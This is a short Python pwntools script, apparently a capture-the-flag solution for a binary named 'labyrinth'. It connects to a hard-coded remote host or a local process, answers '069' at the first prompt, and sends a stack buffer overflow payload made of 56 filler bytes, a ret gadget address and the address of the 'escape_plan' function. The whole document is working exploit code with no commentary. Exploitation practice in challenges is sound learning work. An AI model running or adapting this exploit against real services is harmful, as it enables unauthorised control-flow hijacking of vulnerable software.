from pwn import *

elf = ELF('./labyrinth')
libc = elf.libc

if args.REMOTE:
    p = remote('209.97.134.50', 31510)
else:
    p = process(elf.path)

ret_addr = p64(0x401016) # From ROPgadget
payload = b"A"*(56) + ret_addr + p64(elf.symbols['escape_plan'])

print(p.recvuntil('>>').decode('utf-8'))
p.sendline("069")
print(p.recvuntil('>>').decode('utf-8'))

p.sendline(payload)
print(p.recvall().decode('utf-8'))